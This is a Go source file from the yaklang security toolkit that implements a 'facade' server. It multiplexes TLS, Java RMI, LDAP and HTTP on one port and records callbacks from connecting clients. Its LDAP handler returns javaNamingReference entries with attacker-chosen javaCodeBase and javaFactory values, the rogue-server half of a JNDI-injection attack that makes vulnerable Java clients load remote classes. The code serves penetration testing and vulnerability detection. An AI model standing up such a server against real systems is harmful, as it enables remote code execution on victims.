package facades

import (
	"context"
	"fmt"
	"github.com/lor00x/goldap/message"
	"net"
	"yaklang/common/facades/ldap/ldapserver"
	"yaklang/common/log"
	"yaklang/common/utils"
	"yaklang/common/utils/tlsutils"
	"sync"

	//"palm/common/yak/yaklib"
	"yaklang/common/yak/yaklib/codec"
	"time"
)

type FacadeServer struct {
	Host         string
	Port         int
	ExternalHost string
	//反连地址
	ReverseAddr string

	rmiResourceAddrs           map[string]string
	ldapResourceAddrs          map[string]string
	httpResource               map[string]*HttpResource
	handlers                   []func(notification *Notification)
	RemoteAddrConvertorHandler func(string) string
	//resourceName               string
	ldapEntry map[string]interface{}
	httpMux   *sync.Mutex
}

type FactoryFun func() string
type FacadeServerConfig func(f *FacadeServer)

func SetJavaClassName(name string) FacadeServerConfig {
	return func(f *FacadeServer) {
		f.ldapEntry["javaClassName"] = name
	}
}
func SetLdapResourceAddr(name string, addr string) FacadeServerConfig {
	return func(f *FacadeServer) {
		f.ldapResourceAddrs[name] = addr
	}
}
func SetJavaCodeBase(codeBase string) FacadeServerConfig {
	return func(f *FacadeServer) {
		f.ldapEntry["javaCodeBase"] = codeBase
	}
}
func SetObjectClass(obj string) FacadeServerConfig {
	return func(f *FacadeServer) {
		f.ldapEntry["objectClass"] = obj
	}
}
func SetjavaFactory(factory string) FacadeServerConfig {
	return func(f *FacadeServer) {
		f.ldapEntry["javaFactory"] = factory
	}
}
func SetReverseAddress(address string) FacadeServerConfig {
	return func(f *FacadeServer) {
		f.ReverseAddr = address
	}
}

func (f *FacadeServer) Config(configs ...FacadeServerConfig) {
	for _, config := range configs {
		config(f)
	}
}
func SetRmiResourceAddr(name string, rmiResourceAddr string) FacadeServerConfig {
	return func(f *FacadeServer) {
		f.rmiResourceAddrs[name] = rmiResourceAddr
	}
}

func SetHttpResource(name string, resource []byte) FacadeServerConfig {
	return func(f *FacadeServer) {
		f.OverwriteFileResource("/"+name, resource)
	}
}

//func (f *FacadeServer) SetLDAPEntiy(ldapEntry map[string]interface{}) {
//	f.ldapEntry = ldapEntry
//}
//func (f *FacadeServer) ClassNameFactory(n int) FactoryFun {
//	return func() string {
//		const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
//		b := make([]byte, n)
//		for i := range b {
//			b[i] = letters[rand.Intn(len(letters))]
//		}
//		return string(b)
//	}
//}

/*
	ctx, cancel := context.WithCancel(context.Background())

	httpServer = newHTTPSERVERF()
	httpServer.SetContext(ctx)
	go httpServer.Run()
	err = utils.WaitConnect(httpServer.Addr())
	if err != nil {
		return err
	}

	facades.SetLDAPFallback(func() []byte {
		addr = httpServer.Addr()
		return Marshal(generatePayload(addr))
	})
	go facades.Run()
	err = utils.WaitConn(...)
*/

func (F *FacadeServer) ConvertRemoteAddr(addr string) string {
	if F.RemoteAddrConvertorHandler != nil {
		return F.RemoteAddrConvertorHandler(addr)
	}
	return addr
}

func Serve(host string, port int, configs ...FacadeServerConfig) error {
	server := NewFacadeServer(host, port, configs...)
	err := server.ServeWithContext(context.Background())
	if err != nil {
		return err
	}
	return nil
}

func NewFacadeServer(host string, port int, configs ...FacadeServerConfig) *FacadeServer {
	facadeServer := &FacadeServer{
		Host:              host,
		Port:              port,
		ldapEntry:         make(map[string]interface{}),
		httpResource:      make(map[string]*HttpResource),
		rmiResourceAddrs:  make(map[string]string),
		ldapResourceAddrs: make(map[string]string),
		httpMux:           &sync.Mutex{},
	}
	for _, config := range configs {
		config(facadeServer)
	}
	return facadeServer
}
func (f *FacadeServer) GetAddr() string {
	return fmt.Sprintf("%s:%d", f.Host, f.Port)
}
func (f *FacadeServer) OnHandle(h func(n *Notification)) {
	f.handlers = append(f.handlers, h)
}

func (f *FacadeServer) triggerNotification(t string, conn net.Conn, token string, raw []byte) {
	f.triggerNotificationEx(t, conn, token, raw, "")
}
func (f *FacadeServer) triggerNotificationEx(t string, conn net.Conn, token string, raw []byte, responseInfo string) {
	remoteAddr := f.ConvertRemoteAddr(conn.RemoteAddr().String())

	if token == "" {
		log.Infof("trigger %v from %v", t, f.ConvertRemoteAddr(conn.RemoteAddr().String()))
	} else {
		log.Infof("trigger %v[%v] from %v", t, token, f.ConvertRemoteAddr(conn.RemoteAddr().String()))
	}

	notif := NewNotification(t, remoteAddr, raw, token)
	// 通过conn的地址计算hash（因为每次连接的conn都是独立的对象，所以可以用conn地址的hash区分不同连接）
	// 通过这个hash去判断是否是同一个连接，如果是同一个连接，则在原通知基础上进行更新，否则新增通知
	notif.ConnectHash = codec.Md5(fmt.Sprintf("%p", conn))
	// 响应内容
	notif.ResponseInfo = responseInfo
	if len(f.handlers) <= 0 {
		//spew.Dump(notif)
	}

	for _, handle := range f.handlers {
		if handle == nil {
			return
		}
		handle(notif)
	}
}
func (f *FacadeServer) Serve() error {
	return f.ServeWithContext(context.Background())
}
func (f *FacadeServer) ServeWithContext(ctx context.Context) error {
	log.Debugf("start to handle facade server: for %v", utils.HostPort(f.Host, f.Port))
	lis, err := net.Listen("tcp", utils.HostPort(f.Host, f.Port))
	if err != nil {
		return utils.Errorf("create listen failed: %s", err)
	}

	go func() {
		select {
		case <-ctx.Done():
			lis.Close()
		}
	}()

	for {
		conn, err := lis.Accept()
		if err != nil {
			return err
		}

		go func() {
			defer conn.Close()
			defer func() {
				if err := recover(); err != nil {
					log.Error(err)
					return
				}
			}()
			f.triggerNotification("tcp", conn, "", nil)
			log.Infof("recv conn from: %s", conn.RemoteAddr())
			f.handleConn(conn)
		}()
	}
}

func (f *FacadeServer) handleConn(conn net.Conn) {

	isTls := utils.NewBool(false)
WRAPPER:
	peekableConn := utils.NewPeekableNetConn(conn)
	raw, err := peekableConn.Peek(4)
	//buff := make([]byte, 7)
	//typ, err := peekableConn.Read(buff)
	//typ := utils.StableReaderEx(peekableConn, 5*time.Second, 10240)
	//println(codec.EncodeToHex(typ))
	//br := bufio.NewReader(peekableConn)
	//buf := make([]byte, 12)
	//br.Read(buf)
	//println(codec.EncodeToHex(raw))
	//println(string(raw))
	if err != nil {
		log.Errorf("peek 4byte failed: %s", err)
		return
	}
	switch raw[0] {
	case 0x16: // tls
		tlsConn := tlsutils.NewDefaultTLSServer(peekableConn)
		log.Error("https conn is recv... start to handshake")
		err := tlsConn.Handshake()
		if err != nil {
			conn.Close()
			log.Errorf("handle shake failed: %s", err)
			return
		}
		log.Infof("handshake finished for %v", conn.RemoteAddr())
		//conn = tlsConn
		f.triggerNotification("tls", conn, "", nil)
		isTls.Set()
		goto WRAPPER
	case 'J': // 4a524d49 (JRMI)
		if codec.EncodeToHex(raw) == "4a524d49" {
			log.Info("handle for JRMI")
			println(codec.Md5(fmt.Sprintf("%p", peekableConn.Conn)))
			err := f.rmiShakeHands(peekableConn)
			if err != nil {
				log.Errorf("rmi handshak failed: %s", err)
				peekableConn.Close()
				return
			}

			log.Infof("start to serve for rmi client")
			peekableConn.SetReadDeadline(time.Now().Add(10 * time.Second))
			println(codec.Md5(fmt.Sprintf("%p", peekableConn.Conn)))
			err = f.rmiServe(peekableConn)
			println(codec.Md5(fmt.Sprintf("%p", peekableConn.Conn)))
			if err != nil {
				log.Errorf("serve rmi failed: %s", err)
				peekableConn.Close()
				return
			}

			peekableConn.Close()
			return
		}
	//48, 12, 2, 1, 1, 96, 7, 2, 1, 3, 4, 0, -128, 0, -128, 0, -128, 0,
	//	(48)"Ber.ASN_SEQUENCE | Ber.ASN_CONSTRUCTOR", (12)len, (2,1,1)curMsgId, (97)LdapClient.LDAP_REQ_BIND, (7)len, (2,1,3)isLdapv3, (4)isLdapv3, (...) toServer
	case 0x30:
		if err != nil {
			log.Errorf("peek 3byte failed: %s", err)
			return
		}
		if f.ldapEntry == nil {
			log.Errorf("not set ldap entry")
			return
		}
		f.triggerNotification("ldap_flag", conn, "", nil)
		server := ldapserver.NewServer()
		routes := ldapserver.NewRouteMux()
		routes.Bind(func(writer ldapserver.ResponseWriter, message *ldapserver.Message) {
			res := ldapserver.NewBindResponse(ldapserver.LDAPResultSuccess)
			writer.Write(res)
			return
		})
		routes.Search(func(writer ldapserver.ResponseWriter, m *ldapserver.Message) {
			searchReq := (m.GetSearchRequest())
			reqResource := string((&searchReq).BaseObject())
			//className := "cmd_" + randStr(8)
			//addr := fmt.Sprintf("http://%s/%s.class", peekableConn.RemoteAddr(), f.resourceName)
			e := ldapserver.NewSearchResultEntry(fmt.Sprintf("dc=%s,dc=com", "tmp"))
			var javaCodeBase string
			for name, addr := range f.ldapResourceAddrs {
				if name == reqResource {
					javaCodeBase = addr
				}
			}

			if javaCodeBase == "" {
				f.triggerNotificationEx("ldap_flag", conn, reqResource, nil, "<empty>")
				return
			}
			e.AddAttribute("javaClassName", message.AttributeValue(reqResource)) //类名，可以任意
			e.AddAttribute("javaCodeBase", message.AttributeValue(javaCodeBase)) // CodeBase
			e.AddAttribute("javaFactory", message.AttributeValue(reqResource))   //Factory名，必须和http resource名一致
			e.AddAttribute("objectClass", "javaNamingReference")                 //objectClass
			//e.AddAttribute("javaClassName", "foo")
			//e.AddAttribute("javaCodeBase", message.AttributeValue(addr))
			//e.AddAttribute("objectClass", "javaNamingReference")
			//e.AddAttribute("javaFactory", message.AttributeValue(className))
			writer.Write(e)
			f.triggerNotificationEx("ldap_flag", conn, reqResource, nil, fmt.Sprintf("javaCodeBase: %s", javaCodeBase))
			res := ldapserver.NewSearchResultDoneResponse(ldapserver.LDAPResultSuccess)
			writer.Write(res)
		})
		server.Handle(routes)
		cli, err := server.NewClient(peekableConn)
		if err != nil {
			log.Errorf("start : %s", err)
			return
		}
		cli.Serve()
		peekableConn.Close()
	default:
		log.Infof("start to fallback http handlers for: %s", conn.RemoteAddr())
		err = f.GetHTTPHandler(isTls.IsSet())(peekableConn)
		if err != nil {
			log.Errorf("handle http failed: %s", err)
			return
		}
	}
}
